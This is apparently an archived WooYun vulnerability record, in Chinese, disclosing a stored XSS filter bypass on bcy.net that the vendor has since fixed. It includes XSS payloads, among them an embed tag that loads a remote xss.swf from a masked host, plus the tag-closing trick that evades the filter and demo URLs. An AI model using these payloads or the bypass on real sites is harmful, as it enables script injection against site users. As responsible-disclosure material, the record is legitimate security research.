{"id": 85773, "wybug_id": "wooyun-2016-0187277", "wybug_title": "半次元主站xss跨站脚本攻击过滤规则有点意思", "wybug_corp": "bcy.net", "wybug_author": "路人甲", "wybug_date": "2016-03-21 14:59", "wybug_open_date": "2016-03-21 18:08", "wybug_type": "XSS 跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-03-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-03-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-03-21：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： =。= 详细说明：  今天看乌云的时候，有一个漏洞是半次元主站xss漏洞，传送门 WooYun: 半次元主站存储型xss漏洞 。厂商给出的状态是已经修复，然后去看了下，想看下修复的怎么样了,试下<svg/onload=xxxx然后提交,接着就被过滤了，如图\n\n,以为是带有事件就不解析标签了，然后直接试下<svg然后提交,然而结果是一样的，然后就试试其他标签如自定的<asd></asd>提交下，然后也是一样的效果，，然后就想是不是前端处理，然后在抓包提交的时候发现多了一点东西。他把我提交的内容加入到了一个p标签，如图\n\n，不管3721，改成content=<svg然后forward。。看了下,一样过滤成了最开始的状态，然后再次尝试提交<asd></asd>结果忘了在asd里面加内容，看不到东西。。就查看一下源代码搜索了一下<asd结果搜到了，，而且被解析了，如图\n\n,然后就是试下<video></video>结果也被解析了，那就直接用embed来绕过了，，直接提交<embed code=\"http://*.*.*/xss.swf\" allowscriptacces=true>结果，又没被解析了，如图,\n\n,然后就奇怪了，video没被过滤，embed过滤了，想了一下video我是这么写的有结束符号<video></video>而embed没有结束符号，会不会是有这样一个过滤规则，果断试了一下，结果成功了，如图\n\n,平台也来信了,\n\n,然后就大概猜想了下他的过滤规则只解析第一个标签，而且是包含结束标签的,再去用<img></img>试了下，也成功了，，实际演示地址http://bcy.net/novel/detail/11560/493497，<img></img>演示地址http://bcy.net/novel/detail/11560/493525   漏洞证明：     修复方案：  过滤。。。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：3  确认时间：2016-03-21 16:17 厂商回复： 非常感谢您对半次元信息安全的帮助。 最新状态： 2016-03-21：修复了html的过滤 感谢路人甲  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 3, "Ranks": null}